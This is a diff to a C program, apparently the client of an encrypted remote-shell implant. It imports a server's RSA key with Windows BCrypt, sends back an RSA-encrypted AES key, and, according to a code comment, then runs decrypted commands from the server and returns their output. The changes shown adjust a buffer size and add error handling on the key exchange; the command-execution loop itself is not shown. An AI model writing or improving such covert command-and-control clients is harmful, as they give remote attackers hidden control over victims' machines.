@@ -120,7 +120,7 @@ int main()
     BCRYPT_KEY_HANDLE rsaKey = NULL;
     BYTE *rsaPbinput = NULL;
     ULONG rsaBlobLen = 283; // length of the RSA public key blob received from the server
-    BYTE rsaEncrypted[512];
+    BYTE rsaEncrypted[256];
     ULONG rsaEncryptedLen = sizeof(rsaEncrypted);
     BCRYPT_OAEP_PADDING_INFO oaepInfo = {0};
     oaepInfo.pszAlgId = BCRYPT_SHA256_ALGORITHM;
@@ -188,7 +188,7 @@ int main()
 
     // Receive RSA public key blob length, then receive exactly that many bytes.
     // This is the server's public key in BCrypt BLOB format.
-    if (recv_all(soc, (char *)&rsaBlobLen, sizeof(rsaBlobLen)) <= 0)
+    if (recv_all(soc, (char *)&rsaBlobLen, 4) <= 0)
     {
         closesocket(soc);
         WSACleanup();
@@ -249,7 +249,6 @@ int main()
         printf("key imported !");
 
     HeapFree(GetProcessHeap(), 0, rsaPbinput);
-    rsaPbinput = NULL;
 
     status = BCryptEncrypt(
         rsaKey,
@@ -286,12 +285,20 @@ int main()
     header[3] = (char)((totalLen >> 24) & 0xFF);
     header[4] = 0x01; // Type: RSA-encrypted AES key
 
-    send_all(soc, header, sizeof(header));
-    send_all(soc, (char *)rsaEncrypted, (int)rsaEncryptedLen);
-    rsaUsed = 1;
+    if (send_all(soc, header, sizeof(header)) <= 0 ||
+        send_all(soc, (char *)rsaEncrypted, (int)rsaEncryptedLen) <= 0)
+    {
+        closesocket(soc);
+        return 1;
+    }
 
+
+    
+    rsaUsed = 1;
+    printf("Cle AES chiffree envoyee au serveur !\n");
     BCryptDestroyKey(rsaKey);
     rsaKey = NULL;
+    rsaPbinput = NULL;
 
     // Main receive loop: receive encrypted command packets, decrypt them with AES-GCM, execute shell commands,
     // and send the command output back encrypted after the first RSA-encrypted AES key response.
